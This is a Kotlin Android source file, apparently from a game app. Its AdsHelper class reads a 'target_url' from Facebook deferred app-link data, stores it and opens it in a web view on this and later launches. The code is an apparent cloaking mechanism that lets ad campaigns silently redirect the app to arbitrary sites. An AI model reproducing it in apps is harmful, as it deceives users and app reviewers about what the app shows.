package com.animgames.cave.data

import android.content.Context
import android.util.Log
import com.animgames.cave.receive.MyNotification
import com.facebook.applinks.AppLinkData

class AdsHelper(val context: Context) {
    var url : String? = null
    var mainActivity : WebCallback? = null
    var exec = false
    val sPrefUrl = SharPreferences(context).apply { getSp("fb") }

    init{
        url = sPrefUrl.getStr("url")
        Log.e("Links", url.toString())
        if(url == null) tree()
    }

    fun attachWeb(api : WebCallback){
        mainActivity = api
    }

    private fun tree() {
        AppLinkData.fetchDeferredAppLinkData(context
        ) { appLinkData: AppLinkData? ->
            if (appLinkData != null && appLinkData.targetUri != null) {
                if (appLinkData.argumentBundle["target_url"] != null) {
                    Log.e("DEEP", "SRABOTAL")
                    MyNotification().scheduleMsg(context)
                    exec = true
                    val tree = appLinkData.argumentBundle["target_url"].toString()
                    val uri = tree.split("$")
                    url = "https://" + uri[1]
                    if(url != null){
                        sPrefUrl.putStr("url", url!!)
                        mainActivity?.chrome(url!!, true)
                    }
                }
            }
        }
    }}